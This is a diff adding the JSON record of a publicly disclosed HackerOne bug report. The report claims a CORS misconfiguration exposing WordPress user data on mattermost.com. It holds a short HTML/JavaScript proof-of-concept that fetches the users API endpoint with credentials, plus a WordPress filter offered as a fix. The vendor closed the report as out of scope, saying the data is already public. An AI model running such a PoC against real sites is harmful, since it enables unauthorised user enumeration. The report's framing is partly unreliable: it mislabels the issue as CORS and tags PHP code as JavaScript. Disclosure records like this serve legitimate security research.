@@ -1,0 +1,130 @@
+{
+  "id": 1113759,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTEzNzU5",
+  "url": "https://hackerone.com/reports/1113759",
+  "title": "[mattermost.com] CORS Misconfiguration leakage of admin users",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2021-03-01T12:21:27.381Z",
+  "submitted_at": "2021-03-01T12:21:27.417Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "deb0con",
+    "url": "/deb0con",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-03-19T08:28:33.655Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-12T06:14:57.229Z",
+  "team_member_agreed_on_going_public_at": "2021-03-19T08:28:33.572Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Sumarry :**\nCORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.\nIt's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in Wordpress via API on\nThe vulnerability is registered as #772744 #356047 #591302 #138244 #329791\n\n**Platform(s) Affected: [website]**\nhttps://mattermost.com/wp-json/wp/v2/users/\n\n**Proof On Concept:**\n```javascript\n<html>\n     <body>\n         <h2>CORS PoC</h2>\n         <div id=\"demo\">\n             <button type=\"button\" onclick=\"cors()\">Exploit</button>\n         </div>\n         <script>\n             function cors() {\n             var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState == 4 && this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://mattermost.com/wp-json/wp/v2/users/\", true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         </script>\n     </body>\n </html>\n```\n  * Save as ``.html`` and Open and click Exploit on browsers\n\n**Fix**\nUse this code will hide the users list and give 404 as the result, while rest of the api calls keep running as they were.\n```javascript\nadd_filter( 'rest_endpoints', function( $endpoints ){\n    if ( isset( $endpoints['/wp/v2/users'] ) ) {\n        unset( $endpoints['/wp/v2/users'] );\n    }\n    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\\d]+)'] ) ) {\n        unset( $endpoints['/wp/v2/users/(?P<id>[\\d]+)'] );\n    }\n    return $endpoints;\n});\n```\n\n## Impact\n\nInformation disclosure in **``/wp-json/wp/v2/users/``**",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "0xelkomy",
+    "wgh_",
+    "h4x0r_dz",
+    "bayes"
+  ],
+  "structured_scope": {
+    "databaseId": 59133,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.mattermost.com",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 31851,
+      "category": "team",
+      "content": "The issue was reported on our website mattermost.com which is clearly defined as out of scope in our program's policy. Moreover there are no account specific sensitive information revealed here. Whatever information specified is already public and hence we don't see any security impact here. ",
+      "user": {
+        "id": 1382738,
+        "username": "rohitesh_mattermost",
+        "name": "Rohitesh",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2020-11-05T14:18:53.069Z",
+        "url": "https://hackerone.com/rohitesh_mattermost",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra7eh366iu9egy616ute08x1mm4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22mattermost-logo.png%22%3B%20filename%2A%3DUTF-8%27%27mattermost-logo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140627Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed89570429907a5d9c140f841a6eae5af1f0fc6ccc8056f0fbd333ed697e01f6",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra7eh366iu9egy616ute08x1mm4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22mattermost-logo.png%22%3B%20filename%2A%3DUTF-8%27%27mattermost-logo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140627Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6b087bc25fd88b56e48c5d3baf616afc92eb4cc3ff41e266c4ceb306ba239435",
+          "xtralarge": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ra7eh366iu9egy616ute08x1mm4n/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f?response-content-disposition=inline%3B%20filename%3D%22mattermost-logo.png%22%3B%20filename%2A%3DUTF-8%27%27mattermost-logo.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140627Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4a34f2b99a812291d0d84d5e8bf0c1c137b8563bba5469605475da2b58e9b1c8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
